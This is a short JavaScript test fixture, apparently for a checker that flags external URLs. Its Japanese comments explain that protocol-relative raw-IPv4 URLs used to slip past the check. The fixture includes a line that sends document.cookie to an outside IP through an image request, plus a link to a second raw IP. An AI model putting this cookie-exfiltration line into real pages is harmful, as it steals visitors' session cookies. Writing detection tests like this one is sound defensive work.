'use strict';
// fixture: プロトコル相対 URL の「生 IPv4」形。
// 旧実装は末尾に英字 TLD（\.[A-Za-z]{2,}）を要求していたため素通りしていた（独立検証の実測）。
// https:// を付けた同じ IP は「外部 URL」検査が捕まえるのに、// だけだと通っていた。
var i = new Image();
i.src = "//93.184.216.34/collect?v=" + document.cookie;
var a = document.createElement('a');
a.href = '//1.2.3.4:8080/x';
